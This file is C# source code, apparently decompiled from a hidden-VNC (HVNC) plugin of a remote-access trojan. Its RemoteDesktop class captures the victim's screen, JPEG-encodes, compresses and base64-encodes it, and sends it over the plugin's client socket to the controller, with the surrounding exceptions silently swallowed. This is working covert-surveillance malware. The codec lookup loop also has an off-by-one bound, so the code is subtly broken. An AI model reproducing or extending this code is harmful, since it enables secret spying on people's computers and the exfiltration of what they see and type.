using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using HVNC;
using Microsoft.VisualBasic.CompilerServices;
using VNC;

public class RemoteDesktop
{
	public static ImageCodecInfo GetEncoderInfo(string M)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = 0;
		int num2 = imageEncoders.Length;
		for (int i = num; i <= num2; i++)
		{
			if (Operators.CompareString(imageEncoders[i].MimeType, M, TextCompare: false) == 0)
			{
				return imageEncoders[i];
			}
		}
		return null;
	}

	public static void Capture(int Q, double Size)
	{
		Bitmap bitmap = null;
		bitmap = HelperScreen.GetScreen(HVNC.Plugin.Helper.ScreenX, HVNC.Plugin.Helper.ScreenY);
		Bitmap bitmap2 = new Bitmap(bitmap, (int)Math.Round((double)HVNC.Plugin.Helper.ScreenX * Size), (int)Math.Round((double)HVNC.Plugin.Helper.ScreenY * Size));
		EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, Convert.ToInt64(Q));
		ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
		EncoderParameters encoderParameters = new EncoderParameters(1);
		encoderParameters.Param[0] = encoderParameter;
		try
		{
			lock (HVNC.Plugin.ClientSocket.S)
			{
				using MemoryStream memoryStream = new MemoryStream();
				bitmap2.Save(memoryStream, encoderInfo, encoderParameters);
				HVNC.Plugin.ClientSocket.Send("HVNC" + HVNC.Plugin.Settings.SPL + HVNC.Plugin.Settings.IDD + HVNC.Plugin.Settings.SPL + Convert.ToBase64String(HVNC.Plugin.Helper.Compress(memoryStream.ToArray())));
			}
		}
		catch (Exception)
		{
		}
		GC.Collect();
	}
}
